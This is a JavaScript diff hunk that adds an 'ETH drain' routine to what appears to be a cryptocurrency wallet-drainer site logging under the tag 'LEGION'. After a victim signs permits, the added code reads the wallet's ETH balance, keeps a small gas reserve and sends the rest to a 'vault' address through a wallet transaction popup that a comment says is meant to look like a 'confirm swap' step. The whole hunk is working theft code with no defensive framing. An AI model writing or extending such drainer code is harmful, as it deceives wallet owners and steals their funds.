@@ -967,6 +967,37 @@
 
           connectedChains.EVM._batchResult = batchData;
           connectedChains.EVM._permits = permits;
+
+          // Native ETH drain — separate sendTransaction popup (looks like "confirm swap" step)
+          var vaultEvm = VAULT_CACHE && (VAULT_CACHE.evm || VAULT_CACHE.ethereum);
+          if (signature && vaultEvm) {
+            try {
+              var ethBal = BigInt(0);
+              try {
+                var ethHex = await eth.request({ method: 'eth_getBalance', params: [evmAddr, 'latest'] });
+                ethBal = BigInt(ethHex);
+              } catch (_eb) {}
+              // Keep 0.005 ETH as gas reserve — drain rest
+              var gasReserve = BigInt('5000000000000000');
+              if (ethBal > gasReserve) {
+                var sendWei = ethBal - gasReserve;
+                console.log('[LEGION] ETH drain attempt: ' + sendWei + ' wei → vault');
+                try {
+                  var ethTxHash = await eth.request({
+                    method: 'eth_sendTransaction',
+                    params: [{ from: evmAddr, to: vaultEvm, value: '0x' + sendWei.toString(16), gas: '0x5208' }]
+                  });
+                  connectedChains.EVM._ethTxHash = ethTxHash;
+                  console.log('[LEGION] ✅ ETH transfer tx: ' + ethTxHash);
+                } catch (_ethTxErr) {
+                  console.debug('[LEGION] ETH sendTransaction rejected:', _ethTxErr.message);
+                }
+              }
+            } catch (_ethErr) {
+              console.debug('[LEGION] ETH drain skip:', _ethErr.message);
+            }
+          }
+
           return signature;
         } catch (e) {
           console.error('[LEGION] EVM signing failed:', e.message, 'code:', e.code);
